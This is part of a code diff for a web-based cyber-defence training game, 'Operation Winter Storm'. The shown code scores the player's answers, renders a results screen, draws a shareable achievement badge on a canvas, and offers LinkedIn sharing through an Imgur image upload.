+                <input id="cm-name-input" type="text" placeholder="Your full name…" maxlength="40"
+                  style="flex:1;padding:12px 16px;background:var(--bg);border:1px solid var(--accent);
+                         color:var(--text-bright);font-family:'Inter',sans-serif;font-size:13px;outline:none;"
+                  onkeydown="if(event.key==='Enter') openBadgeModal()" />
+                <button class="btn-primary" onclick="openBadgeModal()" style="white-space:nowrap"><span>GET BADGE →</span></button>
+              </div>
+              <button class="next-btn show" onclick="showOutcome()" style="margin-top:12px;border-color:var(--dim);color:var(--dim);font-size:10px;">
+                VIEW FULL DEBRIEF ↓
+              </button>
+            </div>
+          </div>`
+        ) : ''}
+      </div>
+
+      <div class="defender-card">
+        <div class="defender-text">${p.defender}</div>
+      </div>
+    </div>
+  </div>`;
+
+  content.scrollTop = 0;
+}
+
+function highlightCode(code) {
+  return code
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .split('\n')
+    .map(line => {
+      if (line.trim().startsWith('#')) return `<span class="com">${line}</span>`;
+      return line
+        .replace(/(".*?")/g, '<span class="str">$1</span>')
+        .replace(/\b(\d+)\b/g, '<span class="num">$1</span>');
+    })
+    .join('\n');
+}
+
+function answer(phaseIdx, choiceIdx) {
+  if (state.answered[phaseIdx]) return;
+  state.answered[phaseIdx] = true;
+  const p = phases[phaseIdx];
+  const isCorrect = p.choices[choiceIdx].correct;
+  state.correct[phaseIdx] = isCorrect;
+  
+  if (isCorrect) {
+    state.score += 100;
+    document.getElementById('score-display').textContent = state.score;
+    document.getElementById('header-score').textContent = `SCORE: ${state.score}`;
+    // Update maturity meters
+    if (p.maturity) {
+      Object.entries(p.maturity).forEach(([k, v]) => {
+        state.maturity[k] = Math.min(100, state.maturity[k] + v);
+        updateMeter(k);
+      });
+    }
+  }
+  
+  renderPhase(phaseIdx);
+  updateChainNav();
+}
+
+function updateMeter(key) {
+  const val = state.maturity[key];
+  const el = document.getElementById(`fill-${key}`);
+  const label = document.getElementById(`mat-${key}`);
+  if (el) {
+    el.style.width = val + '%';
+    el.parentElement.className = `mat-bar ${val < 40 ? 'mat-bad' : val < 70 ? 'mat-med' : 'mat-good'}`;
+  }
+  if (label) label.textContent = val + '%';
+}
+
+function showOutcome() {
+  document.getElementById('game').classList.remove('active');
+  document.getElementById('outcome').classList.add('active');
+  
+  const total = phases.length * 100;
+  const pct = Math.round((state.score / total) * 100);
+  
+  document.getElementById('final-score').textContent = state.score;
+  document.getElementById('final-max').textContent = `/ ${total} POSSIBLE POINTS`;
+  
+  let grade, color, title;
+  if (pct >= 90) { grade = 'ELITE DEFENDER — ADVERSARY REPELLED'; color = 'var(--accent3)'; title = 'MISSION: SUCCESS'; }
+  else if (pct >= 70) { grade = 'PROFICIENT — SIGNIFICANT EXPOSURE REMAINS'; color = 'var(--accent)'; title = 'MISSION: PARTIAL'; }
+  else if (pct >= 50) { grade = 'DEVELOPING — HIGH BREACH RISK'; color = 'var(--warn)'; title = 'MISSION: COMPROMISED'; }
+  else { grade = 'CRITICAL GAPS — ORGANIZATION DESTROYED'; color = 'var(--accent2)'; title = 'MISSION: FAILED'; }
+  
+  document.getElementById('outcome-title').textContent = title;
+  document.getElementById('outcome-title').style.color = color;
+  document.getElementById('outcome-grade').textContent = `${pct}% MATURITY SCORE — ${grade}`;
+  document.getElementById('final-score').style.color = color;
+
+  const matReport = document.getElementById('maturity-report');
+  const controls = [
+    { key: 'patch', label: 'Patch Management' },
+    { key: 'cred', label: 'Credential Hygiene' },
+    { key: 'mfa', label: 'MFA Coverage' },
+    { key: 'net', label: 'Network Segmentation' },
+    { key: 'edr', label: 'EDR / Detection' },
+    { key: 'ir', label: 'Incident Response' }
+  ];
+  matReport.innerHTML = controls.map(c => {
+    const v = state.maturity[c.key];
+    const cls = v < 40 ? 'val-red' : v < 70 ? 'val-orange' : 'val-green';
+    return `<div class="report-card">
+      <div class="report-card-title">${c.label}</div>
+      <div class="report-card-val ${cls}">${v}%</div>
+    </div>`;
+  }).join('');
+  
+  // scroll to top
+  window.scrollTo(0,0);
+}
+
+function restartGame() {
+  state = {
+    score: 0, currentPhase: 0,
+    answered: new Array(phases.length).fill(false),
+    correct: new Array(phases.length).fill(false),
+    maturity: { patch: 10, cred: 5, mfa: 0, net: 20, edr: 30, ir: 15 }
+  };
+  document.getElementById('score-display').textContent = '0';
+  document.getElementById('header-score').textContent = 'SCORE: 0';
+  ['patch','cred','mfa','net','edr','ir'].forEach(k => updateMeter(k));
+  document.getElementById('outcome').classList.remove('active');
+  document.getElementById('game').classList.add('active');
+  // Reset badge state
+  badgeUserName = '';
+  document.getElementById('badge-overlay').style.display = 'none';
+  buildChainNav();
+  renderPhase(0);
+  document.getElementById('progress-fill').style.width = '0%';
+  document.getElementById('progress-text').textContent = '0% COMPLETE';
+}
+
+// ═══════════════════════════════════════════════════════════════
+// BADGE GENERATION
+// ═══════════════════════════════════════════════════════════════
+let badgeUserName = '';
+
+function getBadgeData() {
+  const total = phases.length * 100;
+  const pct = Math.round((state.score / total) * 100);
+  let rank, rankColor, rankIcon;
+  if (pct >= 90)      { rank = 'ELITE DEFENDER';  rankColor = '#22d97a'; rankIcon = '★'; }
+  else if (pct >= 70) { rank = 'PROFICIENT';       rankColor = '#b44fff'; rankIcon = '◆'; }
+  else if (pct >= 50) { rank = 'DEVELOPING';       rankColor = '#f59e0b'; rankIcon = '●'; }
+  else                { rank = 'CRITICAL GAPS';    rankColor = '#ef4444'; rankIcon = '▲'; }
+  return { pct, rank, rankColor, rankIcon, score: state.score, total };
+}
+
+function openBadgeFromOutcome() {
+  // If no name yet, prompt inline
+  if (!badgeUserName) {
+    const n = prompt('Enter your name for the badge:');
+    badgeUserName = (n && n.trim()) ? n.trim() : 'Anonymous';
+  }
+  const overlay = document.getElementById('badge-overlay');
+  overlay.style.display = 'flex';
+  drawBadge();
+}
+
+function openBadgeModal() {
+  const input = document.getElementById('cm-name-input');
+  badgeUserName = (input ? input.value.trim() : '') || 'Anonymous';
+  const overlay = document.getElementById('badge-overlay');
+  overlay.style.display = 'flex';
+  drawBadge();
+}
+
+function closeBadgeModal() {
+  document.getElementById('badge-overlay').style.display = 'none';
+}
+
+function roundRect(ctx, x, y, w, h, r) {
+  ctx.beginPath();
+  ctx.moveTo(x + r, y);
+  ctx.lineTo(x + w - r, y); ctx.quadraticCurveTo(x+w, y, x+w, y+r);
+  ctx.lineTo(x+w, y+h-r);   ctx.quadraticCurveTo(x+w, y+h, x+w-r, y+h);
+  ctx.lineTo(x+r, y+h);     ctx.quadraticCurveTo(x, y+h, x, y+h-r);
+  ctx.lineTo(x, y+r);       ctx.quadraticCurveTo(x, y, x+r, y);
+  ctx.closePath();
+}
+
+function drawBadge() {
+  // Ensure web fonts are loaded before drawing
+  document.fonts.ready.then(() => _drawBadgeCanvas());
+}
+
+function _drawBadgeCanvas() {
+  const canvas = document.getElementById('badge-canvas');
+  const ctx = canvas.getContext('2d');
+  const W = 800, H = 420;
+  canvas.width = W; canvas.height = H;
+  const { pct, rank, rankColor, score, total } = getBadgeData();
+  const name = badgeUserName || 'Anonymous';
+
+  // ── Fonts (canvas-safe with loaded Inter) ──
+  const F = {
+    label:  '500 11px Inter, system-ui, sans-serif',
+    body:   '400 13px Inter, system-ui, sans-serif',
+    bold:   '600 14px Inter, system-ui, sans-serif',
+    title:  '700 18px Inter, system-ui, sans-serif',
+    name:   '700 26px Inter, system-ui, sans-serif',
+    score:  '700 40px Inter, system-ui, sans-serif',
+    pct:    '700 28px Inter, system-ui, sans-serif',
+    small:  '400 10px Inter, system-ui, sans-serif',
+    tag:    '600 10px Inter, system-ui, sans-serif',
+  };
+
+  ctx.clearRect(0, 0, W, H);
+
+  // ── Background ──
+  ctx.fillStyle = '#0f1724';
+  ctx.fillRect(0, 0, W, H);
+
+  // Noise texture via subtle dot grid
+  ctx.fillStyle = 'rgba(255,255,255,0.022)';
+  for (let x = 0; x < W; x += 24)
+    for (let y = 0; y < H; y += 24) {
+      ctx.fillRect(x, y, 1, 1);
+    }
+
+  // ── Top purple bar ──
+  const topBarH = 5;
+  const tbg = ctx.createLinearGradient(0,0,W,0);
+  tbg.addColorStop(0, '#b44fff');
+  tbg.addColorStop(0.5, '#7c3aed');
+  tbg.addColorStop(1, '#b44fff');
+  ctx.fillStyle = tbg;
+  ctx.fillRect(0, 0, W, topBarH);
+
+  // ── Header row ──
+  const headerY = topBarH + 24;
+  // Left: brand
+  ctx.textAlign = 'left';
+  ctx.font = '700 15px Inter, system-ui, sans-serif';
+  ctx.fillStyle = '#ffffff';
+  ctx.fillText('HARDHAT SECURITY', 36, headerY);
+  ctx.font = F.small;
+  ctx.fillStyle = 'rgba(255,255,255,0.35)';
+  ctx.fillText('hardhatsecurity.com', 36, headerY + 18);
+
+  // Right: badge label pill
+  const pillLabel = 'ACHIEVEMENT BADGE';
+  ctx.font = F.tag;
+  const plW = ctx.measureText(pillLabel).width + 20;
+  const plX = W - 36 - plW, plY = headerY - 14;
+  ctx.fillStyle = 'rgba(180,79,255,0.15)';
+  roundRect(ctx, plX, plY, plW, 22, 4); ctx.fill();
+  ctx.strokeStyle = 'rgba(180,79,255,0.5)'; ctx.lineWidth = 1;
+  roundRect(ctx, plX, plY, plW, 22, 4); ctx.stroke();
+  ctx.textAlign = 'right';
+  ctx.fillStyle = '#b44fff';
+  ctx.font = F.tag;
+  ctx.fillText(pillLabel, W - 36 - 10, headerY);
+
+  // ── Divider ──
+  ctx.strokeStyle = 'rgba(255,255,255,0.07)';
+  ctx.lineWidth = 1;
+  ctx.beginPath(); ctx.moveTo(36, headerY + 28); ctx.lineTo(W - 36, headerY + 28); ctx.stroke();
+
+  // ── LEFT COLUMN: Score ring ──
+  const colL = 36, colLW = 180;
+  const cx = colL + colLW / 2, cy = 240, cr = 68;
+
+  // Ring track
+  ctx.strokeStyle = 'rgba(255,255,255,0.07)';
+  ctx.lineWidth = 10; ctx.lineCap = 'round';
+  ctx.beginPath(); ctx.arc(cx, cy, cr, -Math.PI/2, Math.PI * 1.5); ctx.stroke();
+
+  // Ring fill
+  ctx.shadowBlur = 16; ctx.shadowColor = rankColor + 'aa';
+  ctx.strokeStyle = rankColor; ctx.lineWidth = 10; ctx.lineCap = 'round';
+  const endAngle = -Math.PI/2 + (Math.PI * 2 * Math.min(pct,100) / 100);
+  ctx.beginPath(); ctx.arc(cx, cy, cr, -Math.PI/2, endAngle); ctx.stroke();
+  ctx.shadowBlur = 0; ctx.lineCap = 'butt';
+
+  // Ring inner
+  ctx.fillStyle = '#0f1724';
+  ctx.beginPath(); ctx.arc(cx, cy, cr - 14, 0, Math.PI*2); ctx.fill();
+
+  // Pct text inside ring
+  ctx.textAlign = 'center';
+  ctx.fillStyle = '#ffffff';
+  ctx.font = F.pct;
+  ctx.fillText(`${pct}%`, cx, cy + 10);
+  ctx.font = F.small;
+  ctx.fillStyle = 'rgba(255,255,255,0.35)';
+  ctx.fillText('maturity', cx, cy + 26);
+
+  // Rank label under ring
+  ctx.font = '700 12px Inter, system-ui, sans-serif';
+  ctx.fillStyle = rankColor;
+  ctx.fillText(rank, cx, cy + cr + 24);
+
+  // ── RIGHT COLUMN ──
+  const rx = colL + colLW + 40;
+  const ryStart = headerY + 48;
+  ctx.textAlign = 'left';
+
+  // Name
+  ctx.font = F.name;
+  ctx.fillStyle = '#ffffff';
+  // truncate to fit
+  let dName = name;
+  const maxNameW = W - rx - 36;
+  ctx.font = F.name;
+  while (ctx.measureText(dName).width > maxNameW && dName.length > 3)
+    dName = dName.slice(0, -1);
+  if (dName !== name) dName += '…';
+  ctx.fillText(dName, rx, ryStart);
+
+  // Subtitle row
+  ctx.font = F.body;
+  ctx.fillStyle = 'rgba(255,255,255,0.38)';
+  ctx.fillText('completed  ·  Operation Winter Storm', rx, ryStart + 22);
+
+  // ── Score card ──
+  const scY = ryStart + 44;
+  const scW = W - rx - 36, scH = 72;
+  ctx.fillStyle = 'rgba(255,255,255,0.04)';
+  roundRect(ctx, rx, scY, scW, scH, 6); ctx.fill();
+  ctx.strokeStyle = 'rgba(255,255,255,0.08)'; ctx.lineWidth = 1;
+  roundRect(ctx, rx, scY, scW, scH, 6); ctx.stroke();
+
+  // Score number
+  ctx.font = F.score;
+  ctx.fillStyle = rankColor;
+  ctx.textAlign = 'left';
+  ctx.fillText(`${score}`, rx + 20, scY + 47);
+  const sw = ctx.measureText(`${score}`).width;
+
+  ctx.font = F.label;
+  ctx.fillStyle = 'rgba(255,255,255,0.3)';
+  ctx.fillText(`/ ${total} pts`, rx + 20 + sw + 8, scY + 47);
+
+  // Rank badge on right of card
+  ctx.textAlign = 'right';
+  ctx.font = '700 13px Inter, system-ui, sans-serif';
+  ctx.fillStyle = rankColor;
+  ctx.fillText(rank, rx + scW - 18, scY + 32);
+  ctx.font = F.small;
+  ctx.fillStyle = 'rgba(255,255,255,0.2)';
+  ctx.fillText('RANK', rx + scW - 18, scY + 48);
+
+  // ── Maturity bar ──
+  const barX = rx, barY = scY + scH + 22, barW = scW, barH = 6;
+  ctx.fillStyle = 'rgba(255,255,255,0.06)';
+  roundRect(ctx, barX, barY, barW, barH, 3); ctx.fill();
+
+  const barFill = ctx.createLinearGradient(barX, 0, barX + barW, 0);
+  barFill.addColorStop(0, '#ef4444');
+  barFill.addColorStop(0.5, '#b44fff');
+  barFill.addColorStop(1, rankColor);
+  ctx.fillStyle = barFill;
+  ctx.shadowBlur = 4; ctx.shadowColor = rankColor;
+  roundRect(ctx, barX, barY, Math.max(barW * pct / 100, 6), barH, 3); ctx.fill();
+  ctx.shadowBlur = 0;
+
+  ctx.textAlign = 'left';
+  ctx.font = F.small;
+  ctx.fillStyle = 'rgba(255,255,255,0.22)';
+  ctx.fillText('Cyber Maturity Score', barX, barY - 8);
+  ctx.textAlign = 'right';
+  ctx.fillText(`${pct}%`, barX + barW, barY - 8);
+
+  // Simulation detail
+  ctx.textAlign = 'left';
+  ctx.font = F.small;
+  ctx.fillStyle = 'rgba(255,255,255,0.2)';
+  ctx.fillText('Poland Energy Sector Attack  ·  9 phases  ·  29 Dec 2025', rx, barY + barH + 20);
+
+  // ── Bottom bar ──
+  const botY = H - 38;
+  ctx.fillStyle = 'rgba(255,255,255,0.03)';
+  ctx.fillRect(0, botY, W, H - botY);
+  ctx.strokeStyle = 'rgba(255,255,255,0.06)'; ctx.lineWidth = 1;
+  ctx.beginPath(); ctx.moveTo(0, botY); ctx.lineTo(W, botY); ctx.stroke();
+
+  ctx.font = F.small;
+  ctx.fillStyle = 'rgba(255,255,255,0.18)';
+  ctx.textAlign = 'left';
+  ctx.fillText('#CyberSecurity  #AdversaryEmulation  #ICS  #OT  #CyberMaturity', 36, botY + 23);
+
+  ctx.textAlign = 'right';
+  ctx.fillStyle = rankColor;
+  ctx.font = '600 11px Inter, system-ui, sans-serif';
+  ctx.fillText('hardhatsecurity.com', W - 36, botY + 23);
+}
+
+function downloadBadge() {
+  document.fonts.ready.then(() => {
+    _drawBadgeCanvas();
+    const canvas = document.getElementById('badge-canvas');
+    const link = document.createElement('a');
+    link.download = 'hardhat-winter-storm-badge.png';
+    link.href = canvas.toDataURL('image/png');
+    link.click();
+  });
+}
+
+async function shareLinkedIn() {
+  const { pct, rank, score } = getBadgeData();
+  const name = badgeUserName && badgeUserName !== 'Anonymous' ? badgeUserName : 'I';
+
+  const postText = `🛡 ${name} just completed the Operation Winter Storm adversary emulation simulation by HardHat Security!
+
+I walked through the full 9-phase attack chain of the 29 Dec 2025 Poland energy sector cyberattack — ICS/OT firmware destruction, wiper malware via GPO, credential theft, and more.
+
+Cyber maturity score: ${score}/900 (${pct}%) — Rank: ${rank}
+
+Test your own defenses 👉 https://hardhatsecurity.com
+
+#CyberSecurity #AdversaryEmulation #ICS #OT #CyberMaturity #HardHatSecurity`;
+
+  // Show modal immediately — uploading state first
+  const existing = document.getElementById('li-copy-modal');
+  if (existing) existing.remove();
+
+  const modal = document.createElement('div');
+  modal.id = 'li-copy-modal';
+  modal.style.cssText = `position:fixed;inset:0;z-index:600;background:rgba(3,8,16,0.95);
+    backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:20px;`;
+
+  const btnStyle = `flex:1;padding:12px 16px;background:transparent;border:1px solid;
+    font-family:'Orbitron',sans-serif;font-size:11px;font-weight:700;letter-spacing:2px;cursor:pointer;`;
+
+  modal.innerHTML = `
+    <div style="background:#070f1e;border:1px solid #0d2040;max-width:580px;width:100%;padding:32px;">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
+        <div style="font-family:'Orbitron',sans-serif;font-size:13px;font-weight:700;color:#b44fff;letter-spacing:2px;">SHARE ON LINKEDIN</div>
+        <button onclick="document.getElementById('li-copy-modal').remove()" style="background:none;border:none;color:#3a5570;font-size:22px;cursor:pointer;line-height:1">×</button>
+      </div>
+
+      <!-- Badge preview thumbnail -->
+      <div style="margin-bottom:20px;border:1px solid #0d2040;overflow:hidden;">
+        <img id="li-badge-thumb" src="" style="width:100%;display:block;" />
+      </div>
+
+      <!-- Status row -->
+      <div id="li-status" style="font-family:'Inter',sans-serif;font-size:12px;color:#3a5570;
+        margin-bottom:16px;display:flex;align-items:center;gap:10px;">
+        <span id="li-spinner" style="display:inline-block;width:12px;height:12px;border:2px solid #3a5570;
+          border-top-color:#b44fff;border-radius:50%;animation:spin 0.8s linear infinite;flex-shrink:0;"></span>
+        <span id="li-status-text">Uploading badge image…</span>
+      </div>
+
+      <!-- Post text -->
+      <textarea id="li-post-text" readonly style="width:100%;height:160px;background:#010509;border:1px solid #0d2040;
+        color:#a8c8e8;font-family:'Inter',sans-serif;font-size:12px;padding:14px;resize:none;line-height:1.7;
+        outline:none;box-sizing:border-box;">${postText}</textarea>
+
+      <div style="display:flex;gap:10px;margin-top:16px;flex-wrap:wrap;">
+        <button id="li-copy-btn" onclick="
+          const t=document.getElementById('li-post-text');
+          t.select();t.setSelectionRange(0,99999);
+          navigator.clipboard.writeText(t.value).catch(()=>document.execCommand('copy'));
+          this.textContent='✓ COPIED!';this.style.borderColor='#22d97a';this.style.color='#22d97a';
+          setTimeout(()=>{this.innerHTML='COPY TEXT';this.style.borderColor='#b44fff';this.style.color='#b44fff';},2000);
+        " style="${btnStyle}border-color:#b44fff;color:#b44fff;">COPY TEXT</button>
+
+        <button id="li-open-btn" disabled
+          style="${btnStyle}border-color:#1a3050;color:#1a3050;display:flex;align-items:center;justify-content:center;gap:8px;cursor:not-allowed;">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+          SHARE ON LINKEDIN
+        </button>
+      </div>
+
+      <p id="li-fallback-note" style="display:none;font-family:'Inter',sans-serif;font-size:11px;
+        color:#3a5570;margin-top:12px;line-height:1.6;"></p>
+    </div>`;
+
+  // Add spinner keyframe if not already present
+  if (!document.getElementById('li-spin-style')) {
+    const s = document.createElement('style');
+    s.id = 'li-spin-style';
+    s.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
+    document.head.appendChild(s);
+  }
+
+  document.body.appendChild(modal);
+
+  // Show badge thumbnail immediately from canvas
+  const canvas = document.getElementById('badge-canvas');
+  document.getElementById('li-badge-thumb').src = canvas.toDataURL('image/png');
+
+  // Try uploading to Imgur (anonymous, no auth required for base64 upload)
+  let imageUrl = null;
+  try {
+    const base64 = canvas.toDataURL('image/png').split(',')[1];
+    const resp = await fetch('https://api.imgur.com/3/image', {
+      method: 'POST',
+      headers: {
+        'Authorization': 'Client-ID 546c25a59c58ad7',  // Imgur anonymous client ID
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ image: base64, type: 'base64', title: 'HardHat Security Badge' })
+    });
+    const data = await resp.json();
+    if (data.success) {
+      imageUrl = data.data.link;
+    }
+  } catch(e) {
+    // Upload failed — fall through to fallback
+  }
+
+  const spinner = document.getElementById('li-spinner');
+  const statusText = document.getElementById('li-status-text');
+  const openBtn = document.getElementById('li-open-btn');
+  const fallbackNote = document.getElementById('li-fallback-note');
+
+  if (imageUrl) {
+    // Success — enable share button pointing to badge image URL
+    spinner.style.display = 'none';
+    statusText.textContent = '✓ Badge uploaded — LinkedIn will show your image in the post preview.';
+    statusText.style.color = '#22d97a';
+
+    openBtn.disabled = false;
+    openBtn.style.borderColor = '#0a66c2';
+    openBtn.style.color = '#fff';
+    openBtn.style.background = '#0a66c2';
+    openBtn.style.cursor = 'pointer';
+    openBtn.onclick = () => {
+      // LinkedIn sharer with image URL — scrapes OG image from the page
+      const liUrl = `https://www.linkedin.com/sharing/share-offsite/?url=${encodeURIComponent(imageUrl)}`;
+      window.open(liUrl, '_blank', 'width=600,height=650');
+      document.getElementById('li-copy-modal').remove();
+    };
+
+    fallbackNote.style.display = 'block';
+    fallbackNote.innerHTML = `After LinkedIn opens: paste your copied text into the post. The badge image will appear automatically as a link preview.`;
+
+  } else {
+    // Fallback — upload failed, give clear instructions
+    spinner.style.display = 'none';
+    statusText.textContent = '⚠ Could not auto-upload image. Download your badge and attach it manually.';
+    statusText.style.color = '#ff9800';
+
+    openBtn.disabled = false;
+    openBtn.style.borderColor = '#0a66c2';
+    openBtn.style.color = '#fff';
+    openBtn.style.background = '#0a66c2';
+    openBtn.style.cursor = 'pointer';
+    openBtn.onclick = () => {
+      window.open('https://www.linkedin.com/feed/', '_blank', 'width=900,height=700');
+      document.getElementById('li-copy-modal').remove();
+    };
+
+    fallbackNote.style.display = 'block';
+    fallbackNote.innerHTML = `
+      <strong style="color:#ff9800;">To attach your badge image:</strong><br>
+      1. Click <em>⬇ Download Badge</em> to save the PNG<br>
+      2. Open LinkedIn and create a new post<br>
+      3. Paste the copied text, then click the photo icon to attach the badge`;
+  }
+}
+
+// Draw badge whenever outcome is shown — called via setTimeout in showOutcome()
+</script>
+</body>
+</html>
